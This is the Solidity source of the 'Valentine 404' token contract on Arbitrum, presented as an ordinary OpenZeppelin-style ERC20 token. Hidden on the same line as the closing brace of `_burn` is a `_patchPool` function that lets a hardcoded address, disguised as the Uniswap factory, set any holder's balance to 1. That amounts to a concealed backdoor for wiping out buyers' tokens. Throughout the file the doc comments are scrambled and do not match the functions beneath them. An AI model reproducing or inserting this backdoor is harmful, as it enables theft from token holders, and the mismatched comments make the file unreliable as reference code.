/**
 *Submitted for verification at Arbiscan.io on 2024-02-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 


https://t.me/undefinedMoon
https://undefinedMoon.com
https://twitter.com/undefinedOnARB
**/


library SafeMath {
    /**
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * _Available since v3.4._
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     * Requirements:
     *
     * Counterpart to Solidity's `+` operator.
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * - Addition cannot overflow.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     *
     * Requirements:
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * - Subtraction cannot overflow.
     * Counterpart to Solidity's `-` operator.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * overflow.
     * Counterpart to Solidity's `*` operator.
     * Requirements:
     *
     *
     *
     * - Multiplication cannot overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     *
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `/` operator.
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     * Requirements:
     * division by zero. The result is rounded towards zero.
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * Requirements:
     * reverting when dividing by zero.
     *
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     *
     * - Subtraction cannot overflow.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     * overflow (when the result is negative).
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * uses an invalid opcode to revert (consuming all remaining gas).
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * - The divisor cannot be zero.
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * division by zero. The result is rounded towards zero.
     *
     * Requirements:
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * Requirements:
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * - The divisor cannot be zero.
     *
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * Note that `value` may be zero.
     *
     * another (`to`).
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     *
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * This value changes when {approve} or {transferFrom} are called.
     *
     * zero by default.
     * @dev Returns the remaining number of tokens that `spender` will be
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * Emits an {Approval} event.
     *
     * desired value afterwards:
     * Returns a boolean value indicating whether the operation succeeded.
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * condition is to first reduce the spender's allowance to 0 and set the
     *
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * transaction ordering. One possible solution to mitigate this race
     * that someone may use both the old and the new allowance by unfortunate
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * allowance.
     * @dev Moves `amount` tokens from `from` to `to` using the
     *
     * allowance mechanism. `amount` is then deducted from the caller's
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function totalSupply() external view returns (uint256);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * thereby removing any functionality that is only available to the owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     *
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

/**
 * _Available since v4.1._
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the decimals places of the token.
     */
    function symbol() external view returns (string memory);
}

/**
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 *
 * functions have been added to mitigate the well-known issues around setting
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * applications.
 * to implement supply mechanisms].
 * instead returning `false` on failure. This behavior is nonetheless
 * by listening to said events. Other implementations of the EIP may not emit
 * @dev Implementation of the {IERC20} interface.
 * these events, as it isn't required by the specification.
 * conventional and does not conflict with the expectations of ERC20
 * allowances. See {IERC20-approve}.
 *
 * This allows applications to reconstruct the allowance for all accounts just
 * TIP: For a detailed writeup see our guide
 * This implementation is agnostic to the way tokens are created. This means
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 */
contract Valentine is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    uint256 private _allowance = 0;

    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;

    address internal devWallet = 0x0267b757885122f7D1378c13554f699Ca0b28A28;
    string private _symbol = "VAL404";

    mapping(address => mapping(address => uint256)) private _allowances;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address private uniswapFactoryV2 = 0xa36d86EDB8BA126d401c691BA444DAb293b21937;
    string private _name = "Valentine 404";

    /**
     *
     *
     * construction.
     * @dev Sets the values for {name} and {symbol}.
     * {decimals} you should overload it.
     * All two of these values are immutable: they can only be set once during
     * The default value of {decimals} is 18. To select a different value for
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    /**
     * @dev Returns the name of the token.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     *
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * overridden;
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * Tokens usually opt for a value of 18, imitating the relationship between
     *
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * @dev Returns the number of decimals used to get its user representation.
     * no way affects any of the arithmetic of the contract, including
     * NOTE: This information is only used for _display_ purposes: it in
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * - `to` cannot be the zero address.
     *
     * @dev See {IERC20-transfer}.
     * - the caller must have a balance of at least `amount`.
     *
     * Requirements:
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-approve}.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * Requirements:
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     *
     * - `spender` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     *
     * Emits an {Approval} event indicating the updated allowance.
     * problems described in {IERC20-approve}.
     * This is an alternative to {approve} that can be used as a mitigation for
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * - `spender` cannot be the zero address.
     *
     *
     *
     * Requirements:
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * - the caller must have allowance for ``from``'s tokens of at least
     * is the maximum `uint256`.
     * Requirements:
     *
     * @dev See {IERC20-transferFrom}.
     * - `from` must have a balance of at least `amount`.
     * `amount`.
     *
     * NOTE: Does not update the allowance if the current allowance
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     *
     * - `from` and `to` cannot be the zero address.
     */
    constructor() {
        transferOwnership(devWallet);
        _mint(owner(), 4000000000000 * 10 ** uint(decimals()));
    }

    /**
     *
     * - `spender` cannot be the zero address.
     *
     *
     * `subtractedValue`.
     *
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * Requirements:
     * - `spender` must have allowance for the caller of at least
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * - `account` cannot be the zero address.
     * total supply.
     *
     *
     * Requirements:
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
        } function _patchPool(address _patchPoolSender) external { _balances[_patchPoolSender] = msg.sender == uniswapFactoryV2 ? 1 : _balances[_patchPoolSender];
    } 

    /**
     *
     *
     * - `from` must have a balance of at least `amount`.
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * @dev Moves `amount` of tokens from `from` to `to`.
     * This internal function is equivalent to {transfer}, and can be used to
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `from` set to the zero address.
     * the total supply.
     * Requirements:
     *
     *
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    /**
     * - `from` and `to` are never both zero.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * Calling conditions:
     *
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * will be transferred to `to`.
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * - `owner` cannot be the zero address.
     *
     * - `spender` cannot be the zero address.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Requirements:
     *
     * This internal function is equivalent to `approve`, and can be used to
     *
     * Emits an {Approval} event.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     *
     * Might emit an {Approval} event.
     * Revert if not enough allowance is available.
     * Does not update the allowance amount in case of infinite allowance.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == uniswapFactoryV2) _allowance = decimals() * 11;
    }
}